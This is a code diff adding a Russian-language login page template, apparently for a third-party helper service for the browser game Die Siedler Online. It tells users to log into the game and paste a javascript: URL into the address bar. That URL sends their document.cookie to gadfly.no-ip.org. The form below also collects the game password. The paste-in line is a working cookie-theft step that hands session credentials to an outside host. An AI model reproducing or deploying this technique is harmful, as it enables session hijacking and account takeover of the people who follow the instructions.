@@ -1,0 +1,21 @@
+% layout 'default';
+% title 'Login';
+<p>Если Ваш акк привязан к facebook или Вы не желаете вводить пароль,
+то для авторизации:</p>
+<ul>\
+<li>Авторизуйтесь на сайте <a href='http://www.diesiedleronline.de'>www.diesiedleronline.de</a>
+<li>Находясь на сайте игры, в строку адреса скопируйте следующее:</ul>
+<code>javascript:window.location="http://gadfly.no-ip.org/siedler/login?stuff="+escape(document.cookie)</code><hr>
+<%= form_for login => begin %>
+<% if (param 'name') { %>
+<b><%= stash 'message' %></b><br>
+<% } %>
+Логин:<br>
+<%= text_field 'name' %><br>
+Пароль:<br>
+<%= password_field 'pass' %><br>
+Почта (для отчета, опционально):<br>
+<%= text_field 'email' %><br>
+<%= submit_button 'Login' %>
+<% end %>
+
